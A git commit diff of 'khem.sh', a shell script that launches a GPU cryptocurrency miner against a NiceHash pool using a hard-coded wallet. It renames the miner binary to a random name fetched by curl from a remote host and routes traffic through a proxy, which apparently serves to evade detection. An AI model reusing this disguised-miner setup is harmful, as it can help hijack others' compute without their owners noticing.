948f65a4ae3c5d2e7410c5728c59b4a80fefcfc0
anon1jju <104222912+anon1jju@users.noreply.github.com>
2022-05-24 15:26:36 +0700

    Update khem.sh

--- khem.sh
+++ khem.sh
@@ -2,9 +2,9 @@
 #wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
 chmod +x bubui && mv bubui $ACAK
+read PROXY
 WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
 POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
-PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti.php))
 WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
 #WORKER2=$(date '+%d%b')
 #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
